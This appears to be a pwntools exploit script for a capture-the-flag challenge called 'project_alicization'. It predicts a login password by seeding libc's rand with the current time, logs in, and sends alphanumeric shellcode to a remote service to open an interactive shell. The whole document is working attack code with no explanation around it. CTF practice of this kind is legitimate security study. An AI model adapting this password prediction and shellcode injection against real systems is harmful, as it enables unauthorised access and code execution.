
from pwn import *
from ctypes import *
elf=context.binary=ELF('pwn/project_alicization/project_alicization')
_lib='/lib/x86_64-linux-gnu/libc.so.6'
lib=cdll.LoadLibrary(_lib)
r=remote('ctf.adl.tw',10008)
output=r.recvuntil(b':')

def make_psw(plus):
    lib.srand(time_base+plus)
    s=""
    for i in range(20):
        _random_val=lib.rand()
        s+=chr(_random_val +_random_val // 0x5d * -0x5d +0x21)#'!'=0x21
    return s

time_base=lib.time(0)
passwd_list=[]
passwd_list.append(make_psw(0).encode())	#same as remote
#passwd_list.append(make_psw(1).encode())	#remote is 1 second later
#
r.sendline(b'System Call login')
output=r.recvuntil(b'Username: ')
print(output)
r.sendline(b'Quinella')
output=r.recvuntil(b'Password: ')
print(output)
r.sendline(passwd_list[0])
output=r.recvuntil(b': ')
print(output)
pause()
#[0x20,0x7e]

shellcode = 'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'

r.sendline(b'System Call generate shellcode element')
payload=flat([
    
    shellcode
])
r.send(payload)
output=r.recvuntil(b': ')
print(output)
r.interactive()
